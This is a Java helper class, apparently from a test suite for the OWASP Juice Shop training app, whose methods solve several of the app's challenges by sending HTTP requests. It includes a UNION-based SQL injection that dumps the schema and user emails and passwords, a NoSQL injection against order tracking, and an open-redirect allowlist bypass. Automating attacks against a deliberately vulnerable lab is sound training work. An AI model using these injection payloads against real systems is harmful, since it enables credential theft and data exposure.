package utilities.JuiceShop;

import org.openqa.selenium.json.Json;
import java.io.IOException;
import java.net.http.HttpResponse;
import java.util.ArrayList;
import java.util.List;
import static java.net.HttpURLConnection.HTTP_OK;

/** Application-specific resources actions relocated from the original challenge helper. */
public final class ResourceActions extends ActionContext {
    /**
     * Uses the shared per-test HTTP client and JSON serializer.
     * @param api configured application client
     * @param json shared JSON serializer
     */
    ResourceActions(JuiceShopApi api, Json json) { super(api, json); }

    /**
     * Performs the retrieve nested easter egg action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveNestedEasterEgg() throws IOException, InterruptedException {
        return api.get("/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg");
    }

    /**
     * Performs the retrieve blueprint action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /assets/public/images/products/JuiceShop.stl}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveBlueprint() throws IOException, InterruptedException {
        return api.get("/assets/public/images/products/JuiceShop.stl");
    }

    /**
     * Performs the open premium page action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> openPremiumPage() throws IOException, InterruptedException {
        return api.get("/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us");
    }

    /**
     * Performs the apply imaginary continue code action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> applyImaginaryContinueCode() throws IOException, InterruptedException {
        return api.sendApi("PUT", "/rest/continue-code/apply/69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkM6Ae9M7k2rK63YpqQLPjnlb5V5LvDj", null, null);
    }

    /**
     * Performs the bypass redirect allowlist action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> bypassRedirectAllowlist() throws IOException, InterruptedException {
        return api.get("/redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop");
    }

    /**
     * Performs the retrieve database schema action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveDatabaseSchema() throws IOException, InterruptedException {
        return searchWithUnion("sqlite_master", "sql", "'2'", "'3'");
    }

    /**
     * Performs the search with union action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /rest/products/search?q=}.</p>
     *
     * @param table the database table included in the lab-only UNION query
     * @param first the expression selected as the first result column
     * @param second the expression selected as the second result column
     * @param third the expression selected as the third result column
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    private HttpResponse<String> searchWithUnion(String table, String first, String second, String third)
            throws IOException, InterruptedException {
        List<String> columns = new ArrayList<>(List.of(first, second, third));
        for (int i = 4; i <= 10; i++) columns.add("'" + i + "'");

        String query = "qwert')) UNION SELECT " + String.join(",", columns) + " FROM " + table + "--";
        var response = api.get("/rest/products/search?q=" + encode(query));

        if (response.statusCode() != HTTP_OK)
            throw new IllegalStateException("Union query failed: HTTP " + response.statusCode() + " " + response.body());

        return response;
    }

    /**
     * Performs the retrieve user credentials action against the isolated Juice Shop test application.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> retrieveUserCredentials() throws IOException, InterruptedException {
        return searchWithUnion("Users", "id", "email", "password");
    }

    /**
     * Performs the exfiltrate orders via no SQL action against the isolated Juice Shop test application.
     *
     * <p>Uses the Juice Shop endpoint {@code /rest/track-order/}.</p>
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> exfiltrateOrdersViaNoSql() throws IOException, InterruptedException {
        return api.get("/rest/track-order/" + encode("' || true || '"));
    }
}
